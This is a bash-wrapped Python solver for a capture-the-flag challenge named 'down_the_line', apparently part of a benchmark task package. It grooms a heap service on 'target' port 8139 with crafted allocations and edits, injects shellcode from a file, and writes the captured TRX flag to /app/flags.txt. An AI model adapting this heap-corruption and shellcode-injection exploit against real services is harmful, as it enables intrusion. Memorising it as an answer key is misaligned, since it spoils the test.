#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
cd "$SCRIPT_DIR/upstream-solve"

python3 - <<'PY'
from __future__ import annotations

import pathlib
import re
import socket
import struct


def recvall_until(sock: socket.socket, marker: bytes, timeout: float = 30.0) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def sendafter(sock: socket.socket, marker: bytes, data: bytes) -> None:
    recvall_until(sock, marker)
    sock.sendall(data)


def pack16(value: int) -> bytes:
    return value.to_bytes(2, "little")


def alloc(sock: socket.socket, size: int) -> None:
    sendafter(sock, b"> ", b"1\r")
    sendafter(sock, b"> ", str(size).encode() + b"\r")


def edit(sock: socket.socket, index: int, data: bytes) -> None:
    sendafter(sock, b"> ", b"2\r")
    sendafter(sock, b"> ", str(index).encode() + b"\r")
    sendafter(sock, b"> ", data)


def show(sock: socket.socket, index: int, port: int) -> None:
    sendafter(sock, b"> ", b"3\r")
    sendafter(sock, b"> ", str(index).encode() + b"\r")
    sendafter(sock, b"> ", str(port).encode() + b"\r")


with socket.create_connection(("target", 8139), timeout=30) as sock:
    alloc(sock, 0xC000 - 0x1000 - 1)
    alloc(sock, 0xFFF)
    alloc(sock, 0xFFFE - 0xD000)
    alloc(sock, 1)
    edit(sock, 3, pack16(0x92) * (0xCA0 // 2))
    show(sock, 0, 0)
    shellcode = pathlib.Path("shellcode.bin").read_bytes()
    payload = bytearray(0x40 + 32)
    payload[0x20:0x20 + len(shellcode)] = shellcode
    payload[0x40:0x42] = pack16(0)
    payload[0x42:0x44] = pack16(0)
    edit(sock, 3, bytes(payload))
    output = recvall_until(sock, b"}", timeout=60)

match = re.search(rb"TRX\{[^}\r\n]+\}", output)
if not match:
    raise SystemExit(f"flag not found in down_the_line output: {output[-1000:]!r}")
flag = match.group(0).decode()
pathlib.Path("/app/flags.txt").write_text(flag + "\n")
print(flag)
PY
